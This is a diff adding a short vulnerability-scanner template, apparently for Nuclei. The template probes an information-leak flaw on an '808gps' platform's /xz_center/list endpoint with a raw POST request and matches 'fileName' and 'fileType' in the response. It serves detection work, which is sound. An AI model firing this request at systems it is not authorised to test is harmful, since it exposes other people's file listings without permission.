@@ -1,0 +1,26 @@
+id: 808gps-xz_center-infoleak
+
+info:
+  name: 808gps-xz_center-infoleak
+  author: 808gps-xz_center-infoleak
+
+
+requests:
+  - raw:
+      - |     
+        POST /xz_center/list HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json, text/javascript, */*; q=0.01
+        X-Requested-With: XMLHttpRequest
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
+        Connection: close
+        
+        page=1
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains_all(body,'fileName','fileType')"
